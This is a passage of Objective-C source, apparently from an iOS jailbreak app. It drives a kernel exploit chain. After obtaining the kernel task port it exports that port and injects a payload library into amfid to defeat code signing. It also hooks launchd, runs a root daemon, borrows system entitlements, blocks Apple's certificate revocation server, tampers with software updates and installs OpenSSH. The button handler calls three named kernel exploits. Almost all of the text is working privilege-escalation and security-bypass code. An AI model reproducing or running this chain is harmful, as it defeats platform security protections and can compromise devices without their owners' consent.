        // Set HSP4.
        
        LOG("Setting HSP4...");
        PROGRESS("Exploiting... (35/63)", 0, 0);
        SETMESSAGE("Failed to set HSP4.");
        _assert(remap_tfp0_set_hsp4(&tfp0, GETOFFSET(zone_map_ref)) == 0, message);
        LOG("Successfully set HSP4.");
    }
    
    {
        if (export_kernel_task_port) {
            // Export Kernel Task Port.
            PROGRESS("Exploiting... (36/63)", 0, 0);
            LOG("Exporting Kernel Task Port...");
            SETMESSAGE("Failed to Export Kernel Task Port.");
            make_host_into_host_priv();
            LOG("Successfully Exported Kernel Task Port.");
        }
    }
    
    {
        // Patch amfid.
        
        LOG("Patching amfid...");
        PROGRESS("Exploiting... (37/63)", 0, 0);
        SETMESSAGE("Failed to patch amfid.");
        CLEAN_FILE("/private/var/tmp/amfid_payload.alive");
        _assert(inject_library(findPidOfProcess("amfid"), "/jb/amfid_payload.dylib") == 0, message);
        _assert(waitForFile("/private/var/tmp/amfid_payload.alive") == 0, message);
        LOG("Successfully patched amfid.");
    }
    
    {
        // Spawn jailbreakd.
        
        LOG("Spawning jailbreakd...");
        PROGRESS("Exploiting... (38/63)", 0, 0);
        SETMESSAGE("Failed to spawn jailbreakd.");
        CLEAN_FILE("/usr/lib/libjailbreak.dylib");
        _assert(symlink("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib") == 0, message);
        CLEAN_FILE("/usr/lib/libjailbreacy.dylib");
        _assert(rename("/jb/libjailbreacy.dylib", "/usr/lib/libjailbreacy.dylib") == 0, message);
        CLEAN_FILE("/bin/launchctl");
        _assert(rename("/jb/launchctl", "/bin/launchctl") == 0, message);
        CLEAN_FILE("/jb/jailbreakd.plist");
        md = [[NSMutableDictionary alloc] init];
        md[@"Label"] = @"jailbreakd";
        md[@"Program"] = @"/jb/jailbreakd";
        md[@"EnvironmentVariables"] = [[NSMutableDictionary alloc] init];
        md[@"EnvironmentVariables"][@"KernelBase"] = ADDRSTRING(kernel_base);
        md[@"EnvironmentVariables"][@"KernProcAddr"] = ADDRSTRING(rk64(GETOFFSET(kernproc)));
        md[@"EnvironmentVariables"][@"ZoneMapOffset"] = ADDRSTRING(GETOFFSET(zone_map_ref) - kernel_slide);
        md[@"EnvironmentVariables"][@"AddRetGadget"] = ADDRSTRING(GETOFFSET(add_x0_x0_0x40_ret));
        md[@"EnvironmentVariables"][@"OSBooleanTrue"] = ADDRSTRING(GETOFFSET(OSBoolean_True));
        md[@"EnvironmentVariables"][@"OSBooleanFalse"] = ADDRSTRING(GETOFFSET(OSBoolean_False));
        md[@"EnvironmentVariables"][@"OSUnserializeXML"] = ADDRSTRING(GETOFFSET(osunserializexml));
        md[@"EnvironmentVariables"][@"Smalloc"] = ADDRSTRING(GETOFFSET(smalloc));
        md[@"UserName"] = @"root";
        md[@"MachServices"] = [[NSMutableDictionary alloc] init];
        md[@"MachServices"][@"zone.sparkes.jailbreakd"] = [[NSMutableDictionary alloc] init];
        md[@"MachServices"][@"zone.sparkes.jailbreakd"][@"HostSpecialPort"] = @(15);
        md[@"RunAtLoad"] = @(YES);
        md[@"KeepAlive"] = @(YES);
        md[@"StandardErrorPath"] = @"/var/log/jailbreakd-stderr.log";
        md[@"StandardOutPath"] = @"/var/log/jailbreakd-stdout.log";
        _assert(([md writeToFile:@"/jb/jailbreakd.plist" atomically:YES]) == 1, message);
        INIT_FILE("/jb/jailbreakd.plist", 0, 0644);
        CLEAN_FILE("/var/log/jailbreakd-stderr.log");
        CLEAN_FILE("/var/log/jailbreakd-stdout.log");
        CLEAN_FILE("/private/var/tmp/jailbreakd.pid");
        _assert(execCommandAndWait("/bin/launchctl", "load", "/jb/jailbreakd.plist", NULL, NULL, NULL) == 0, message);
        _assert(waitForFile("/private/var/tmp/jailbreakd.pid") == 0, message);
        LOG("Successfully spawned jailbreakd.");
    }
    
    {
        // Patch launchd.
        
        SETMESSAGE("Failed to patch launchd.");
        CLEAN_FILE("/usr/lib/pspawn_hook.dylib");
        _assert(symlink("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib") == 0, message);
        if ((access("/etc/rc.d/substrate", F_OK) != 0) && load_tweaks) {
            LOG("Patching launchd...");
            PROGRESS("Exploiting... (39/63)", 0, 0);
            CLEAN_FILE("/var/log/pspawn_hook_launchd.log");
            CLEAN_FILE("/var/log/pspawn_hook_xpcproxy.log");
            CLEAN_FILE("/var/log/pspawn_hook_other.log");
            _assert(inject_library(1, "/usr/lib/pspawn_hook.dylib") == 0, message);
            LOG("Successfully patched launchd.");
        }
    }
    
    {
        // Update version string.
        
        LOG("Updating version string...");
        PROGRESS("Exploiting... (40/63)", 0, 0);
        SETMESSAGE("Failed to update version string.");
        _assert(uname(&u) == 0, message);
        kernelVersionString = (char *)[[NSString stringWithFormat:@"%s %s", u.version, DEFAULT_VERSION_STRING] UTF8String];
        for (int i = 0; !(i >= 5 || strstr(u.version, kernelVersionString) != NULL); i++) {
            _assert(updateVersionString(kernelVersionString, tfp0, kernel_base) == 0, message);
            _assert(uname(&u) == 0, message);
        }
        _assert(strstr(u.version, kernelVersionString) != NULL, message);
        LOG("Successfully updated version string.");
    }
    
    {
        SETMESSAGE("Failed to Restore RootFS.");
        if ((!access("/electra", F_OK) && !(is_symlink("/electra") == 1)) || restore_rootfs) {
            // Borrow entitlements from fsck_apfs.
            
            LOG("Borrowing entitlements from fsck_apfs...");
            PROGRESS("Exploiting... (41/63)", 0, 0);
            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
            LOG("Successfully borrowed entitlements from fsck_apfs.");
            
            // We now have fs_snapshot_rename.
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot back...");
            PROGRESS("Exploiting... (42/63)", 0, 0);
            NOTICE("Will restore RootFS. This may take a while. Don't exit the app and don't let the device lock.", 1, 1);
            SETMESSAGE("Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present");
            if (kCFCoreFoundationVersionNumber < 1452.23) {
                if (!access("/private/var/tmp/rootfsmnt", F_OK)) {
                    _assert(rmdir("/private/var/tmp/rootfsmnt") == 0, message);
                }
                _assert(mkdir("/private/var/tmp/rootfsmnt", 0755) == 0, message);
            }
            if (snapshot_check("/", "electra-prejailbreak") == 1) {
                if (kCFCoreFoundationVersionNumber < 1452.23) {
                    _assert(snapshot_mount("/", "electra-prejailbreak", "/private/var/tmp/rootfsmnt") == 0, message);
                } else {
                    _assert(snapshot_rename("/", "electra-prejailbreak", systemSnapshot()) == 0, message);
                }
            } else if (snapshot_check("/", "orig-fs") == 1) {
                if (kCFCoreFoundationVersionNumber < 1452.23) {
                    _assert(snapshot_mount("/", "orig-fs", "/private/var/tmp/rootfsmnt") == 0, message);
                } else {
                    _assert(snapshot_rename("/", "orig-fs", systemSnapshot()) == 0, message);
                }
            } else {
                _assert(snapshot_mount("/", systemSnapshot(), "/private/var/tmp/rootfsmnt") == 0, message);
            }
            if (kCFCoreFoundationVersionNumber < 1452.23) {
                _assert(waitForFile("/private/var/tmp/rootfsmnt/sbin/launchd") == 0, message);
                _assert(easyPosixSpawn([NSURL fileURLWithPath:@"/jb/rsync"], @[@"-vaxcH", @"--progress", @"--delete-after", @"--exclude=/Developer", @"/private/var/tmp/rootfsmnt/.", @"/"]) == 0, message);
            }
            LOG("Successfully renamed system snapshot back.");
            
            // Clean up.
            
            LOG("Cleaning up...");
            PROGRESS("Exploiting... (43/63)", 0, 0);
            SETMESSAGE("Failed to clean up.");
            cleanUpFileList = getCleanUpFileList();
            _assert(cleanUpFileList != nil, message);
            for (NSString *fileName in cleanUpFileList) {
                if (!access([fileName UTF8String], F_OK)) {
                    _assert([[NSFileManager defaultManager] removeItemAtPath:fileName error:nil] == 1, message);
                }
            }
            LOG("Successfully cleaned up.");
            
            // Disallow SpringBoard to show non-default system apps.
            
            LOG("Disallowing SpringBoard to show non-default system apps...");
            PROGRESS("Exploiting... (44/63)", 0, 0);
            md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
            if (md == nil) {
                md = [[NSMutableDictionary alloc] init];
            }
            if (![md[@"SBShowNonDefaultSystemApps"] isEqual:@(NO)]) {
                md[@"SBShowNonDefaultSystemApps"] = @(NO);
                _assert([md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES] == 1, message);
            }
            LOG("Successfully disallowed SpringBoard to show non-default system apps.");
            
            // Disable RootFS Restore.
            
            LOG("Disabling RootFS Restore...");
            PROGRESS("Exploiting... (45/63)", 0, 0);
            setPreference(@K_RESTORE_ROOTFS, @(NO));
            LOG("Successfully disabled RootFS Restore");
            
            // Reboot.
            
            LOG("Rebooting...");
            PROGRESS("Exploiting... (46/63)", 0 ,0);
            NOTICE("RootFS has successfully been restored. The device will be restarted.", 1, 0);
            _assert(reboot(0x400) == 0, message);
            LOG("Successfully rebooted.");
        }
    }
    
    {
        // Extract bootstrap.
        
        LOG("Extracting bootstrap...");
        PROGRESS("Exploiting... (47/63)", 0, 0);
        SETMESSAGE("Failed to extract bootstrap.");
        if (access("/.installed_unc0ver", F_OK)) {
            _assert(chdir("/") == 0, message);
            rv = execCommandAndWait("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", "/jb/strap.tar.lzma", NULL, NULL);
            _assert(rv == 512 || rv == 0, message);
            rv = _system("/usr/libexec/cydia/firmware.sh");
            _assert(WEXITSTATUS(rv) == 0, message);
            rv = _system("/usr/bin/dpkg --configure -a");
            _assert(WEXITSTATUS(rv) == 0, message);
            a = fopen("/.installed_unc0ver", "w");
            LOG("a: " "%p" "\n", a);
            _assert(a != NULL, message);
            _assert(fclose(a) == 0, message);
            INIT_FILE("/.installed_unc0ver", 0, 0644);
            run_uicache = 1;
        }
        _assert(chdir("/jb") == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/amfid_payload.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/launchctl.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/jailbreakd.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/libjailbreak.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/libjailbreacy.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/pspawn_hook.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/tar.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/lzma.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/spawn.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/strap.tar.lzma", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/debugserver.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/rsync", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/rsync.tar", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/lzma", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/usr/bin/debugserver", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/ln", "-s", "/jb/debugserver", "/usr/bin/debugserver", NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/usr/bin/spawn", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/ln", "-s", "/jb/spawn", "/usr/bin/spawn", NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/electra", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/ln", "-s", "/jb", "/electra", NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/rm", "-rf", "/.bootstrapped_electra", NULL, NULL, NULL) == 0, message);
        _assert(execCommandAndWait("/bin/ln", "-s", "/.installed_unc0ver", "/.bootstrapped_electra", NULL, NULL) == 0, message);
        LOG("Successfully extracted bootstrap.");
    }
    
    {
        if (access("/.cydia_no_stash", F_OK)) {
            // Disable stashing.
            
            LOG("Disabling stashing...");
            PROGRESS("Exploiting... (48/63)", 0, 0);
            SETMESSAGE("Failed to disable stashing.");
            a = fopen("/.cydia_no_stash", "w");
            LOG("a: " "%p" "\n", a);
            _assert(a != NULL, message);
            _assert(fclose(a) == 0, message);
            INIT_FILE("/.cydia_no_stash", 0, 0644);
            LOG("Successfully disabled stashing.");
        }
    }
    
    {
        if (disable_app_revokes) {
            // Disable app revokes.
            LOG("Disabling app revokes...");
            PROGRESS("Exploiting... (49/63)", 0, 0);
            SETMESSAGE("Failed to disable app revokes.");
            blockDomainWithName("ocsp.apple.com");
            LOG("Successfully disabled app revokes.");
        }
    }
    
    {
        // Allow SpringBoard to show non-default system apps.
        
        LOG("Allowing SpringBoard to show non-default system apps...");
        PROGRESS("Exploiting... (50/63)", 0, 0);
        SETMESSAGE("Failed to allow SpringBoard to show non-default system apps.");
        md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
        _assert(md != nil, message);
        for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]); i++) {
            _assert(kill(findPidOfProcess("cfprefsd"), SIGSTOP) == 0, message);
            md[@"SBShowNonDefaultSystemApps"] = @(YES);
            _assert([md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES] == 1, message);
            _assert(kill(findPidOfProcess("cfprefsd"), SIGKILL) == 0, message);
            md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
            _assert(md != nil, message);
        }
        _assert([md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)], message);
        LOG("Successfully allowed SpringBoard to show non-default system apps.");
    }
    
    {
        // Fix Auto Updates.
        
        LOG("Fixing Auto Updates...");
        PROGRESS("Exploiting... (51/63)", 0, 0);
        SETMESSAGE("Failed to fix auto updates.");
        if (!access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", F_OK)) {
            _assert(rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated") == 0, message);
        }
        if (!access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", F_OK)) {
            _assert(rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd") == 0, message);
        }
        if (!access("/System/Library/com.apple.mobile.softwareupdated.plist", F_OK)) {
            _assert(rename("/System/Library/com.apple.mobile.softwareupdated.plist", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist") == 0, message);
            _assert(execCommandAndWait("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL, NULL, NULL) == 0, message);
        }
        if (!access("/System/Library/com.apple.softwareupdateservicesd.plist", F_OK)) {
            _assert(rename("/System/Library/com.apple.softwareupdateservicesd.plist", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist") == 0, message);
            _assert(execCommandAndWait("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL, NULL, NULL) == 0, message);
        }
        LOG("Successfully fixed Auto Updates.");
    }
    
    {
        if (disable_auto_updates) {
            // Disable Auto Updates.
            
            LOG("Disabling Auto Updates...");
            PROGRESS("Exploiting... (52/63)", 0, 0);
            SETMESSAGE("Failed to disable auto updates.");
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/ln", "-s", "/dev/null", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/ln", "-s", "/dev/null", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/ln", "-s", "/dev/null", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/ln", "-s", "/dev/null", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL) == 0, message);
            LOG("Successfully disabled Auto Updates.");
        } else {
            // Enable Auto Updates.
            
            LOG("Enabling Auto Updates...");
            PROGRESS("Exploiting... (53/63)", 0, 0);
            SETMESSAGE("Failed to enable auto updates.");
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/mkdir", "-p", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/mkdir", "-p", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/mkdir", "-p", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/bin/mkdir", "-p", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0, message);
        }
    }
    
    {
        if (increase_memory_limit) {
            // Increase memory limit.
            
            LOG("Increasing memory limit...");
            PROGRESS("Exploiting... (54/63)", 0, 0);
            SETMESSAGE("Failed to increase memory limit.");
            bzero(buf_targettype, sizeof(buf_targettype));
            size = sizeof(buf_targettype);
            _assert(sysctlbyname("hw.targettype", buf_targettype, &size, NULL, 0) == 0, message);
            md = [[NSMutableDictionary alloc] initWithContentsOfFile:[NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", buf_targettype]];
            _assert(md != nil, message);
            md[@"Version4"][@"System"][@"Override"][@"Global"][@"UserHighWaterMark"] = md[@"Version4"][@"PListDevice"][@"MemoryCapacity"];
            _assert(([md writeToFile:[NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", buf_targettype] atomically:YES]) == 1, message);
            LOG("Successfully increased memory limit.");
        }
    }

    {
        if (install_openssh) {
            // Extract OpenSSH.
            LOG("Extracting OpenSSH...");
            PROGRESS("Exploiting... (55/63)", 0, 0);
            SETMESSAGE("Failed to extract OpenSSH.");
            CLEAN_FILE("/jb/openssh.tar");
            CLEAN_FILE("/jb/openssh.deb");
            CLEAN_FILE("/jb/ca-certificates.deb");
            _assert(moveFileFromAppDir("openssh.tar", "/jb/openssh.tar") == 0, message);
            a = fopen("/jb/openssh.tar", "rb");
            LOG("a: " "%p" "\n", a);
            _assert(a != NULL, message);
            untar(a, "openssh.deb");
            _assert(fclose(a) == 0, message);
            INIT_FILE("/jb/openssh.deb", 0, 0644);
            INIT_FILE("/jb/openssl.deb", 0, 0644);
            INIT_FILE("/jb/ca-certificates.deb", 0, 0644);
            LOG("Successfully extracted OpenSSH.");
            
            // Install OpenSSH.
            LOG("Installing OpenSSH...");
            PROGRESS("Exploiting... (56/63)", 0, 0);
            SETMESSAGE("Failed to install OpenSSH.");
            rv = _system("/usr/bin/dpkg -i /jb/openssh.deb /jb/openssl.deb /jb/ca-certificates.deb");
            _assert(WEXITSTATUS(rv) == 0, message);
            LOG("Successfully installed OpenSSH.");
            
            // Disable Install OpenSSH.
            LOG("Disabling Install OpenSSH...");
            PROGRESS("Exploiting... (57/63)", 0, 0);
            SETMESSAGE("Failed to disable Install OpenSSH.");
            setPreference(@K_INSTALL_OPENSSH, @(NO));
            LOG("Successfully disabled Install OpenSSH.");
        }
    }

    {
        if (install_cydia) {
            // Extract Cydia.
            LOG("Extracting Cydia...");
            PROGRESS("Exploiting... (58/63)", 0, 0);
            SETMESSAGE("Failed to extract Cydia.");
            CLEAN_FILE("/jb/cydia.tar");
            CLEAN_FILE("/jb/cydia.deb");
            CLEAN_FILE("/jb/cydia-lproj.deb");
            _assert(moveFileFromAppDir("cydia.tar", "/jb/cydia.tar") == 0, message);
            a = fopen("/jb/cydia.tar", "rb");
            LOG("a: " "%p" "\n", a);
            _assert(a != NULL, message);
            untar(a, "cydia.deb");
            _assert(fclose(a) == 0, message);
            INIT_FILE("/jb/cydia.deb", 0, 0644);
            INIT_FILE("/jb/cydia-lproj.deb", 0, 0644);
            LOG("Successfully extracted Cydia.");
            
            // Install Cydia.
            LOG("Installing Cydia...");
            PROGRESS("Exploiting... (59/63)", 0, 0);
            SETMESSAGE("Failed to install Cydia.");
            rv = _system("/usr/bin/dpkg -i /jb/cydia.deb /jb/cydia-lproj.deb");
            _assert(WEXITSTATUS(rv) == 0, message);
            LOG("Successfully installed Cydia.");
            
            // Disable Install Cydia.
            LOG("Disabling Install Cydia...");
            PROGRESS("Exploiting... (60/63)", 0, 0);
            SETMESSAGE("Failed to disable Install Cydia.");
            setPreference(@K_INSTALL_CYDIA, @(NO));
            LOG("Successfully disabled Install Cydia.");
        }
    }

    {
        if (load_daemons) {
            // Load Daemons.
            
            LOG("Loading Daemons...");
            PROGRESS("Exploiting... (61/63)", 0, 0);
            SETMESSAGE("Failed to load Daemons.");
            _system("echo 'really jailbroken';"
                    "shopt -s nullglob;"
                    "for a in /Library/LaunchDaemons/*.plist;"
                        "do echo loading $a;"
                        "launchctl load \"$a\" ;"
                    "done; ");
            if (load_tweaks) {
                _system("for file in /etc/rc.d/*; do "
                            "if [[ -x \"$file\" ]]; then "
                                "\"$file\";"
                            "fi;"
                        "done");
            } else {
                _system("for file in /etc/rc.d/*; do "
                            "if [[ \"$file\" != \"/etc/rc.d/substrate\" ]]; then "
                                "if [[ -x \"$file\" ]]; then "
                                    "\"$file\";"
                                "fi;"
                            "fi;"
                        "done");
            }
            sleep(2);
            LOG("Successfully loaded Daemons.");
        }
    }

    {
        if (run_uicache) {
            // Run uicache.
            
            LOG("Running uicache...");
            PROGRESS("Exploiting... (62/63)", 0, 0);
            SETMESSAGE("Failed to run uicache.");
            _assert(execCommandAndWait("/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL) == 0, message);
            setPreference(@K_REFRESH_ICON_CACHE, @(NO));
            LOG("Successfully ran uicache.");
        }
    }
    
    {
        if (load_tweaks) {
            // Load Tweaks.
            
            LOG("Loading Tweaks...");
            PROGRESS("Exploiting... (63/63)", 0, 0);
            SETMESSAGE("Failed to run ldrestart");
            if (reload_system_daemons) {
                rv = _system("nohup bash -c \""
                             "launchctl unload /System/Library/LaunchDaemons/com.apple.backboardd.plist && "
                             "ldrestart ;"
                             "launchctl load /System/Library/LaunchDaemons/com.apple.backboardd.plist"
                             "\" 2>&1 >/dev/null &");
            } else {
                rv = _system("nohup bash -c \""
                             "launchctl unload /System/Library/LaunchDaemons/com.apple.backboardd.plist ;"
                             "launchctl load /System/Library/LaunchDaemons/com.apple.backboardd.plist"
                             "\" 2>&1 >/dev/null &");
            }
            _assert(WEXITSTATUS(rv) == 0, message);
            LOG("Successfully loaded Tweaks.");
        }
    }
}

- (IBAction)tappedOnJailbreak:(id)sender
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        if (isJailbroken() == 1) {
            PROGRESS("Jailbroken", 0, 1);
            return;
        } else if (!(isSupported() == 1)) {
            PROGRESS("Unsupported", 0, 1);
            return;
        }
        // Initialize kernel exploit.
        LOG("Initializing kernel exploit...");
        PROGRESS("Exploiting... (1/63)", 0, 0);
        switch ([[NSUserDefaults standardUserDefaults] integerForKey:@K_EXPLOIT]) {
            case 0: {
                vfs_sploit();
                break;
            }
            
            case 1: {
                mptcp_go();
                break;
            }
            case 2: {
                async_wake_go();
                break;
            }
                
            default: {
                break;
            }
        }
        // Validate TFP0.
        LOG("Validating TFP0...");
        _assert(MACH_PORT_VALID(tfp0), "Exploit failed. Reboot and try again.");
        LOG("Successfully validated TFP0.");
        // NOTICE("Jailbreak succeeded, but still needs a few minutes to respring.", 0, 0);
        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]);
        PROGRESS("Jailbroken", 0, 1);
    });
}

+ (NSURL *)getURLForUserName:(NSString *)userName {
    if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetbot://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetbot:///user_profile/%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitterrific://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"twitterrific:///profile?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetings://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetings:///user?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitter://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    } else {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    }
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    sharedController = self;
    if (isJailbroken() == 1) {
        PROGRESS("Jailbroken", 0, 1);
    } else if (!(isSupported() == 1)) {
        PROGRESS("Unsupported", 0, 1);
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleDefault;
}

- (IBAction)tappedOnPwn:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"Pwn20wnd"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnDennis:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"DennisBednarz"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamB:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"sbingner"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamG:(id)sender{
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://reddit.com/u/Samg_is_a_Ninja"] options:@{} completionHandler:nil];
}

// This intentionally returns nil if called before it's been created by a proper init
+(ViewController*)sharedController {
    return sharedController;
}

- (id)initWithCoder:(NSCoder *)aDecoder {
    NSLog(@"initWithCoder called");
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithCoder:aDecoder];
        }
    }
    self = sharedController;
    return self;
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
        }
    }
    self = sharedController;
    return self;
}

- (id)init {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super init];
        }
    }
    self = sharedController;
    return self;
}

@end
